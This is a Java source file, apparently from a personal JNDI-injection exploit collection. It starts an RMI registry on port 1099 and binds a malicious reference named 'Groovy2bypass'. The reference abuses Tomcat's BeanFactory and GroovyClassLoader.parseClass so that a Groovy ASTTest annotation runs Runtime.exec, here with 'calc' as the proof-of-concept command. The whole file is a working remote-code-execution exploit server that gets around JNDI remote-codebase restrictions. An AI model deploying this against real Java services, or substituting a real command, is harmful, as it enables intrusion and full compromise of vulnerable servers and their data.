package com.yyjccc.jndi.JNDI.highbypass;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Groovy {

	public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
		Registry registry = LocateRegistry.createRegistry(1099);
		ResourceRef resourceRef = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
		resourceRef.add(new StringRefAddr("forceString", "faster=parseClass"));
		String script = String.format("@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"%s\")\n})\ndef faster\n", "calc");
		resourceRef.add(new StringRefAddr("faster",script));
		ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
		registry.bind("Groovy2bypass", referenceWrapper);
		System.out.println("Registry运行中......");
	}
}
